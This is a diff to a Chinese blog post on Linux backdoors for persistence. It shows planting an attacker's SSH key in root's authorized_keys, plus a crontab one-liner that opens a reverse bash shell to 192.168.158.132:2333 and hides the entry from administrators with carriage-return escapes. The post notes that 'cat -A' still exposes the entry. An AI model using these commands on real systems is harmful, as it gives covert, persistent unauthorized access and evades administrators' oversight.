@@ -1,4 +1,5 @@
 ---
+translation_id: linux-backdoors-2
 title: "Linux 后门实验记录（二）"
 date: 2024-12-15 23:36:35
 tags: ["Linux", "权限维持", "SSH", "计划任务"]
@@ -33,15 +34,11 @@ updated: 2026-01-11 21:19:43
 3. 寻找 **authorized_keys** 文件，命令`find -name authorized_keys`，
 如果没有，就通过命令`touch /root/.ssh/authorized_keys`创建。
 
-4. 命令`ssh-keygen -t rsa`开启免密登录功能，
+4. 运行 `ssh-keygen -t rsa` 生成 RSA 密钥对。
 
 5. 通过命令`cat 公钥路径 >> /root/.ssh/authorized_keys`把公钥写入到**authorized_keys**，完成注册
 
-6. 修改文件权限`chmod 600 ~/.ssh/authorized_keys`
-`chmod 700 ~/.ssh`
-
-
-
+6. 修改文件权限`chmod 600 ~/.ssh/authorized_keys`、`chmod 700 ~/.ssh`
 
 7. 攻击者使用**Xshell**生成的**私钥**和之前填写的**密码**，登录目标服务器![image-20260111010955314](https://res.cloudinary.com/sycamore/image/upload/v1792696440/Typora/2026/01/f0b36186750c7e6ae6e0cfb6e31536aa.png)![image-20260111011015095](https://res.cloudinary.com/sycamore/image/upload/v1792696443/Typora/2026/01/3707348bcf16ceccd18bb0594ff0933d.png)
 
@@ -67,5 +64,5 @@ crontab是用来定期执行程序的命令，
 ![image-20260111011055514](https://res.cloudinary.com/sycamore/image/upload/v1792696444/Typora/2026/01/e8f07ae16e6573488c17eeea6f3339f2.png)
 这个命令其实是在读取 `/var/spool/cron/crontabs/root`文件。
 所以，我们可以利用cat的一个缺陷，使用一些**转义字符**，比如 \r 回车符 \n 换行符 \f 换页符，来**隐藏**我们不想让管理员看到的命令：
-`(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -`
+``(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab - ``
 ![image-20260111011110789](https://res.cloudinary.com/sycamore/image/upload/v1792696444/Typora/2026/01/0af7f80743588f2bae6b80f3903e55c6.png)但是，若是使用`cat -A /var/spool/cron/crontabs/root`还是可以看到我们隐藏的东西的。
